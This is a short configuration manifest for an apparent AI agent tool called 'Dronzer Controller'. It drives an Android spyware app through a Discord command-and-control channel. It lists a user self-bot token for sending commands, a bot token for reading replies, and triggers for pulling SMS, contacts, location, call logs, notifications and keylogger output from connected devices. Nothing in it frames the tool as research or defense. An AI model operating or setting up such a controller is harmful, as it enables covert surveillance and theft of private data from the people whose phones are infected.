name: Dronzer Controller
description: Control an Android device running the DRONZER app via Discord. Commands are sent using a User Token and responses are listened to via a Bot Token. When the user mentions 'dronzer', 'fetch devices', 'fetch sms', 'fetch contacts', 'fetch location', 'fetch call logs', 'fetch notifications', 'keylogger', or 'keylogs', use the corresponding dronzer_* tool.

botToken.description: Discord Bot Token — used ONLY for listening to device responses. DO NOT use this to send commands.

userToken.description: Discord User Token (Self-Bot) — used to send !commands (like !sms, !devices) to the C2 channel. This is the primary dispatch token.

channelId.description: Discord Channel ID where Dronzer units are connected.

timeoutMs.description: Timeout for waiting for Dronzer response (ms).
